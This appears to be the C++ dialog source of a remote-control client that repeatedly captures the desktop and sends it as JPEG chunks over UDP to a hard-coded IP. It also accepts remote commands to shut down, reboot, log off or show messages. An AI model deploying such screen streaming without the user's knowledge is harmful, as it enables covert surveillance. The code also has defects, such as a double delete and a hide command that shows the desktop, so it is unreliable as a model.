
// RCclientDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "RCclient.h"
#include "RCclientDlg.h"
#include "afxdialogex.h"
#include "math.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#define CM_RECEIVED  WM_USER+2
#define GraphSize    40960


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CRCclientDlg 对话框

int GetCodecClsid(const WCHAR* format, CLSID* pClsid)
{
   UINT  num = 0; 
   UINT  size = 0;

   ImageCodecInfo* pImageCodecInfo = NULL;
   GetImageEncodersSize(&num, &size);
   if(size == 0)
      return -1;

	pImageCodecInfo = new ImageCodecInfo[size];
   if(pImageCodecInfo == NULL)
   {
	   delete []pImageCodecInfo;
      return -1; 
	}
   GetImageEncoders(num, size, pImageCodecInfo);
   for(UINT j = 0; j < num; ++j)
   {
      if( wcscmp(pImageCodecInfo[j].MimeType, format) == 0 )
      {
         *pClsid = pImageCodecInfo[j].Clsid;
		 delete [] pImageCodecInfo;
         return j; 
      }    
   } 
   delete [] pImageCodecInfo;
   return -1;
} 


CRCclientDlg::CRCclientDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CRCclientDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CRCclientDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CRCclientDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_TIMER()
	ON_MESSAGE(CM_RECEIVED,&OnReceived)
END_MESSAGE_MAP()


// CRCclientDlg 消息处理程序

BOOL CRCclientDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	HANDLE hToken;//查找权限
	OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken);

	TOKEN_PRIVILEGES Privilege;
	LookupPrivilegeValue(NULL,"Seshutdownprivilege",&Privilege.Privileges[0].Luid);
	Privilege.PrivilegeCount=1;
	Privilege.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;

	DWORD dwLen;//更改权限
	AdjustTokenPrivileges(hToken,false,&Privilege,sizeof(TOKEN_PRIVILEGES),NULL,&dwLen);

	GdiplusStartup(&m_pGdiToken,&m_gdiplusStartupInput,NULL);//初始化GDI+库

	WSADATA wsData;//初始化Winsocket
	::WSAStartup(MAKEWORD(2,2), &wsData);
	//获取本机IP
	char    HostName[100];
    gethostname(HostName, sizeof(HostName));// 获得本机主机名.

	hostent* phost=gethostbyname(HostName);
	char* localIP=inet_ntoa(*(struct in_addr *)*phost->h_addr_list);
	/*char* localIP=inet_ntoa(*(struct in_addr *)*phost->h_addr_list);*/
	/*char* localIP="127.0.0.1";*/
	//

	m_Addr.sin_family = AF_INET;//发送
	m_Addr.sin_port   = htons(5002);
	m_Addr.sin_addr.S_un.S_addr = inet_addr("171.94.196.36");//设置服务器IP


	sockaddr_in addr;//监听
	addr.sin_family=AF_INET;
	addr.sin_addr.S_un.S_addr=inet_addr(localIP);

	addr.sin_port=htons(5001);
	m_Socket=socket(AF_INET,SOCK_DGRAM,0);//创建udp socket                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
	if(m_Socket==INVALID_SOCKET)
	{
		MessageBox("套接字创建失败！");
	}
	char* len="9999";
	if(setsockopt(m_Socket,SOL_SOCKET,SO_SNDBUF,len,4)!=0)
	{
		MessageBox("设置失败！");
	}
	if(bind(m_Socket,(sockaddr*)&addr,sizeof(addr))==SOCKET_ERROR)
	{
		MessageBox("套接字绑定失败！");
	}
	//
	//设置服务器端IP
	m_ServerIP="127.0.0.1";
	//
	//
	m_pSendBuf=new char[1024*1024];
	m_pHeader=m_pSendBuf;
	int ret=WSAAsyncSelect(m_Socket,m_hWnd,CM_RECEIVED,FD_READ);//CM_RECEIVED表示想程序发送这个消息，当收到数据时

	/*listen(m_Socket,5);*/

	m_Confirm=TRUE;
	OnOK();
	m_Received=FALSE;
	m_Counter=0;
	SetTimer(1,1000,NULL);
	
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CRCclientDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CRCclientDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CRCclientDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

//当收到服务器的信息后执行下面的操作
LRESULT CRCclientDlg::OnReceived(WPARAM wParam,LPARAM lParam)
{
	char* pData=new char[sizeof(DataPackage)];
	memset(pData,0,sizeof(DataPackage));
	sockaddr_in addr;
	int factsize=sizeof(sockaddr);
	int ret=recvfrom(m_Socket,pData,sizeof(DataPackage),0,(sockaddr*)&addr,&factsize);
	if(ret!=-1)
	{
		DataPackage Package;
		memcpy(&Package,pData,sizeof(DataPackage));
		delete []pData;
		if(Package.MsgType==CT_Confirm)
		{
			m_Received=TRUE;
			m_FrameIndex+=1;
			if(m_FrameIndex<m_Count)
				SendData(m_FrameIndex,m_Mod,m_Bmpsize,m_JpegSize,m_Count,m_pSendBuf,m_Addr);
			else
				OnOK();
		}
		//下面根据信息执行不同的操作
		else if(Package.MsgType==CT_HideDesk)
		{
			HWND hWnd=::FindWindow("Progman",NULL);
			::ShowWindow(hWnd,SW_SHOW);
		}
		else if(Package.MsgType==CT_ShowDesk)
		{
			HWND hWnd=::FindWindow("Progman",NULL);
			::ShowWindow(hWnd,SW_SHOW);
		}
		else if(Package.MsgType==CT_ShutDown)
		{
			ExitWindowsEx(EWX_SHUTDOWN|EWX_POWEROFF,0);
		}
		else if(Package.MsgType==CT_Logout)
		{
			ExitWindowsEx(EWX_LOGOFF,0);
		}
		else if(Package.MsgType==CT_SendText)
		{
			MessageBox(Package.Content,"提示");
		}
		else if(Package.MsgType==CT_ReRun)
		{
			ExitWindowsEx(EWX_REBOOT,0);
		}
		else if(Package.MsgType==CT_CloseClient)
		{
			OnCancel();
		}
		else
		{
			delete []pData;
		}
	}
	return TRUE;
}

//
//抓取桌面DC
//
void CRCclientDlg::OnOK() 
{
	CDC* pDeskDC =  GetDesktopWindow()->GetDC();		//获取桌面画布对象
	CRect rc;
	GetDesktopWindow()->GetClientRect(rc);				//获取屏幕的客户区域

	CDC  memDC;											//定义一个内存画布
	memDC.CreateCompatibleDC(pDeskDC);					//创建一个兼容的画布
	CBitmap bmp;
	bmp.CreateCompatibleBitmap(pDeskDC,rc.Width(),rc.Height());	//创建兼容位图
	memDC.SelectObject(&bmp);							//选中位图对象	
	BITMAP bitmap;
	bmp.GetBitmap(&bitmap);

	int panelsize  = 0;									//记录调色板大小
	if (bitmap.bmBitsPixel<16)							//判断是否为真彩色位图
		panelsize = pow(double(2),double(bitmap.bmBitsPixel*sizeof(RGBQUAD)));

	BITMAPINFO *pBInfo = (BITMAPINFO*)LocalAlloc(LPTR,sizeof(BITMAPINFO)+panelsize);
	pBInfo->bmiHeader.biBitCount = bitmap.bmBitsPixel;
	pBInfo->bmiHeader.biClrImportant  = 0;
	pBInfo->bmiHeader.biCompression   = 0;
	pBInfo->bmiHeader.biHeight        = bitmap.bmHeight;
	pBInfo->bmiHeader.biPlanes        = bitmap.bmPlanes;
	pBInfo->bmiHeader.biSize          = sizeof(BITMAPINFO);
	pBInfo->bmiHeader.biSizeImage     = bitmap.bmWidthBytes*bitmap.bmHeight;
	pBInfo->bmiHeader.biWidth         = bitmap.bmWidth;
	pBInfo->bmiHeader.biXPelsPerMeter = 0;
	pBInfo->bmiHeader.biYPelsPerMeter = 0;

	memDC.BitBlt(0,0,bitmap.bmWidth,bitmap.bmHeight,pDeskDC,0,0,SRCCOPY);

	char* pData = new char[bitmap.bmWidthBytes* bitmap.bmHeight];
	::GetDIBits(memDC.m_hDC,bmp,0,bitmap.bmHeight,pData,pBInfo,DIB_RGB_COLORS);

	int BufSize = panelsize+ sizeof(BITMAPINFO)+bitmap.bmWidthBytes*bitmap.bmHeight;
	Bitmap*  mmage;
	mmage = Bitmap::FromBITMAPINFO(pBInfo,pData);
	CLSID clsid;
	GetCodecClsid(L"image/jpeg", &clsid);
	HGLOBAL m_hMem = GlobalAlloc(GMEM_MOVEABLE, 0);
	IStream *pstm=NULL;
	CreateStreamOnHGlobal(m_hMem, TRUE, &pstm);
	mmage->Save(pstm,&clsid,NULL);
	m_JpegSize = GlobalSize(m_hMem);
	LPBYTE lpData = (LPBYTE)GlobalLock(m_hMem);



	m_Bmpsize = GraphSize;
	//计算每个位图发送的次数
	m_Count = m_JpegSize / GraphSize;
	m_Mod   = m_JpegSize % GraphSize;
	if ( m_Mod != 0)
		m_Count+=1;
	m_FrameIndex = 0;
	memcpy(m_pSendBuf,lpData,m_JpegSize);

	int ret = SendData(m_FrameIndex,m_Mod,GraphSize,m_JpegSize,m_Count,m_pSendBuf,m_Addr);


	memDC.DeleteDC();
	pDeskDC->DeleteDC();
	pstm->Release();
	if (mmage)
		delete mmage;
	delete [] pData;
	GlobalUnlock(m_hMem);
	GlobalFree(m_hMem);
	::LocalFree((HLOCAL)pBInfo);
	bmp.DeleteObject();

}

//
//服务器5秒不响应，就重新发送
//
void CRCclientDlg::OnTimer(UINT nIDEvent) 
{
	if(!m_Received)
	{
		m_Counter++;
		if(m_Counter>5)
		{
			m_Counter=0;
			OnOK();
		}
	}
	else
	{
		m_Received=FALSE;
		m_Counter=0;
	}
	CDialog::OnTimer(nIDEvent);
}

void CRCclientDlg::OnCancel()
{
	GdiplusShutdown(m_pGdiToken);
	::WSACleanup(); 
	delete[]m_pHeader;
	CDialog::OnCancel();
}

int CRCclientDlg::SendData(UINT index, int mod , int bmpsize , int totalsize ,int frames,char *pSendBuf, sockaddr_in &addr)
{
		
	char* pPackage;
	int packsize = 0; 
	if ( mod ==0 || index != frames-1)
		packsize = 2+2+bmpsize+4+4+4;
	else 
		packsize = 2+2+mod+4+4+4;
	pPackage = new char[packsize];
	memset(pPackage,0,packsize);
	//填充数据报
	*(WORD*)&pPackage[0] = index;	
	if (index != frames-1)			
		*(WORD*)&pPackage[2] = 0;		
	else
		*(WORD*)&pPackage[2] = 1;
	//填充位图数据
	pSendBuf += bmpsize*index;
	memcpy(&pPackage[4],pSendBuf,packsize-12);
	//填充位图大小
	*(int*)&pPackage[packsize-12] = bmpsize;
	//填充JPG数据总大小
	*(int*)&pPackage[packsize-8] = totalsize;
	//填充数据报大小
	*(int*)&pPackage[packsize-4] = packsize;
	m_Confirm = FALSE;

	char* len="9999";//设置发送的套接字m_Socket
	/*SOCKET  socketBro=WSASocket(AF_INET,SOCK_DGRAM,0,NULL,0,WSA_FLAG_OVERLAPPED);
	setsockopt(socketBro,SOL_SOCKET,SO_SNDBUF,len,4);*/

	int ret   = sendto(m_Socket,pPackage,packsize,0,(sockaddr*)&addr,sizeof(addr));
	
	int res=WSAGetLastError();

	delete[] pPackage;
	return ret;

}


